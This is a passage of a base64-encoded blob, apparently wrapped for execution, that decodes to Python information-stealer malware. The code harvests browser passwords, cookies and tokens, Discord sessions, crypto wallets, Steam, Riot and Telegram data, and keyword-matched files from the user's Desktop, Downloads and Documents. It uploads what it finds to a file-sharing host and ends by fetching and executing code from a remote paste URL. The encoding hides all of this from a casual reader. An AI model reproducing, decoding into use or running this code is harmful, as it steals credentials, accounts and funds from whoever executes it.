0gRmFsc2UKICAgICAgICBmb3IgbCBpbiBkYXRhOgogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOgogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgaWYgZm91bmQgPT0gRmFsc2U6IHJldHVybgogICAgICAgIG5hbWUgPSBhcmcKCgogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgIyBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiZW9nYWVhb2VobGVmIiBpbiBhcmc6CiAgICAgICAgV2FsbGV0c1ppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQogICAgZWxpZiAiTmF0aW9uc0dsb3J5IiBpbiBuYW1lIG9yICJTdGVhbSIgaW4gbmFtZSBvciAiUmlvdENsaSIgaW4gbmFtZToKICAgICAgICBHYW1pbmdaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgIGVsc2U6CiAgICAgICAgT3RoZXJaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKCgpkZWYgR2F0aGVyQWxsKCk6CiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcKICAgIGJyb3dzZXJQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgImJyYXZlLmV4ZSIsICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICJlZGdlLmV4ZSIsICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0KICAgIF0KCiAgICBkaXNjb3JkUGF0aHMgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L0Rpc2NvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkY2FuYXJ5IiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZHB0YiIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICBdCgogICAgUGF0aHNUb1ppcCA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLAogICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLAogICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAic3RlYW0uZXhlIiwgIlN0ZWFtIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXSwKICAgICAgICBbZiJ7bG9jYWx9L1Jpb3QgR2FtZXMvUmlvdCBDbGllbnQvRGF0YSIsICJSaW90Q2xpZW50U2VydmljZXMuZXhlIiwgIlJpb3RDbGllbnQiXQogICAgXQogICAgVGVsZWdyYW0gPSBbZiJ7cm9hbWluZ30vVGVsZWdyYW0gRGVza3RvcC90ZGF0YSIsICd0ZWxlZ3JhbS5leGUnLCAiVGVsZWdyYW0iXQoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRQYXNzdywgYXJncz1bcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICBUaENva2sgPSBbXQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaENva2suYXBwZW5kKGEpCgogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2F0aGVyWmlwcywgYXJncz1bYnJvd3NlclBhdGhzLCBQYXRoc1RvWmlwLCBUZWxlZ3JhbV0pLnN0YXJ0KCkKCgogICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkKICAgIERFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybgoKICAgICMgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgIyAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgCiAgICAjIGZvciBwYXR0IGluIFBhdGhzVG9aaXA6CiAgICAjICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAKICAgICMgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W1RlbGVncmFtWzBdLCBUZWxlZ3JhbVsyXSwgVGVsZWdyYW1bMV1dKS5zdGFydCgpCgogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OiAKICAgICAgICB0aHJlYWQuam9pbigpCiAgICBnbG9iYWwgdXB0aHMKICAgIHVwdGhzID0gW10KCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXTogCiAgICAgICAgIyB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkKICAgICAgICB1cGxvYWQoZmlsZS5yZXBsYWNlKCIudHh0IiwgIiIpLCB1cGxvYWRUb0Fub25maWxlcyhvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKSkKCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToKICAgIHRyeTpyZXR1cm4gcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8ve3JlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuZ29maWxlLmlvL2dldFNlcnZlciIpLmpzb24oKVsiZGF0YSJdWyJzZXJ2ZXIiXX0uZ29maWxlLmlvL3VwbG9hZEZpbGUnLCBmaWxlcz17J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfSkuanNvbigpWyJkYXRhIl1bImRvd25sb2FkUGFnZSJdCiAgICBleGNlcHQ6cmV0dXJuIEZhbHNlCgojIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKTpzCiMgICAgIHRyeToKIyAgICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KIyAgICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiMgICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAojICAgICAgICAgcmV0dXJuIHVybAojICAgICBleGNlcHQ6CiMgICAgICAgICByZXR1cm4gRmFsc2UKZGVmIEtpd2lGb2xkZXIocGF0aEYsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIG1heGZpbGVzcGVyZGlyID0gNwogICAgaSA9IDAKICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgZmZvdW5kID0gW10KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgIGkgKz0gMQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgZmZvdW5kLmFwcGVuZChbcGF0aEYgKyAiLyIgKyBmaWxlLCB1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pCgpLaXdpRmlsZXMgPSBbXQpkZWYgS2l3aUZpbGUocGF0aCwga2V5d29yZHMpOgogICAgZ2xvYmFsIEtpd2lGaWxlcwogICAgZmlmb3VuZCA9IFtdCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoICsgIi8iICsgZmlsZSkgYW5kICIudHh0IiBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoICsgIi8iICsgZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUKICAgICAgICAgICAgICAgICAgICBLaXdpRm9sZGVyKHRhcmdldCwga2V5d29yZHMpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aCwgZmlmb3VuZF0pCgpkZWYgS2l3aSgpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgIHVzZXIgKyAiL0Rvd25sb2FkcyIsCiAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgXQoKICAgIGtleV93b3Jkc0ZvbGRlciA9IFsKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBhc3N3IiwKICAgICAgICAic2VjcmV0IgoKICAgIF0KCiAgICBrZXlfd29yZHNGaWxlcyA9IFsKICAgICAgICAicGFzc3ciLAogICAgICAgICJtZHAiLAogICAgICAgICJtb3RkZXBhc3NlIiwKICAgICAgICAibW90X2RlX3Bhc3NlIiwKICAgICAgICAibG9naW4iLAogICAgICAgICJzZWNyZXQiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGF5cGFsIiwKICAgICAgICAiYmFucXVlIiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAid2FsbGV0IiwKICAgICAgICAiY3J5cHRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImNvZGUiLAogICAgICAgICJtZW1vIiwKICAgICAgICAiY29tcHRlIiwKICAgICAgICAidG9rZW4iLAogICAgICAgICJiYWNrdXAiLAogICAgICAgICJzZWNyZXQiCiAgICAgICAgXQoKICAgIHdpa2l0aCA9IFtdCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDogCiAgICAgICAga2l3aSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUtpd2lGaWxlLCBhcmdzPVtwYXR0LCBrZXlfd29yZHNGaWxlc10pO2tpd2kuc3RhcnQoKQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkKICAgIHJldHVybiB3aWtpdGgKCgpnbG9iYWwga2V5d29yZCwgY29va2lXb3JkcywgcGFzd1dvcmRzLCBDb29raUNvdW50LCBQYXNzd0NvdW50LCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCgprZXl3b3JkID0gWwogICAgJ21haWwnLCAnW2NvaW5iYXNlXShodHRwczovL2NvaW5iYXNlLmNvbSknLCAnW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywgJ1tzdGVhbV0oaHR0cHM6Ly9zdGVhbS5jb20pJywgJ1tkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKScsICdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywgJ1t5b3V0dWJlXShodHRwczovL3lvdXR1YmUuY29tKScsICdbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pJywgJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCAnW3R3aXR0ZXJdKGh0dHBzOi8vdHdpdHRlci5jb20pJywgJ1tmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pJywgJ2NhcmQnLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnYmFuaycsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ2J1eScsICdzZWxsJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdjcnlwdG8nLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScKXQoKQ29va2lDb3VudCwgUGFzc3dDb3VudCA9IDAsIDAKY29va2lXb3JkcyA9IFtdCnBhc3dXb3JkcyA9IFtdCgpXYWxsZXRzWmlwID0gW10gIyBbTmFtZSwgTGlua10KR2FtaW5nWmlwID0gW10KT3RoZXJaaXAgPSBbXQoKR2F0aGVyQWxsKCkKREVURUNURUQgPSBUcnVzdChDb29raWVzKQojIERFVEVDVEVEID0gRmFsc2UKaWYgbm90IERFVEVDVEVEOgogICAgd2lraXRoID0gS2l3aSgpCgogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQoKICAgIGZpbGV0ZXh0ID0gIlxuIgogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6CiAgICAgICAgaWYgbGVuKGFyZ1syXSkgIT0gMDoKICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0gICAgICAgCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi8J+TgSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIuKUlOKUgDpvcGVuX2ZpbGVfZm9sZGVyOiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICB1cGxvYWQoImtpd2kiLCBmaWxldGV4dCkKZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcHN0LmtsZ3J0aC5pby9wYXN0ZS9iYmVoeS9yYXciKS50ZXh0KQo="""))
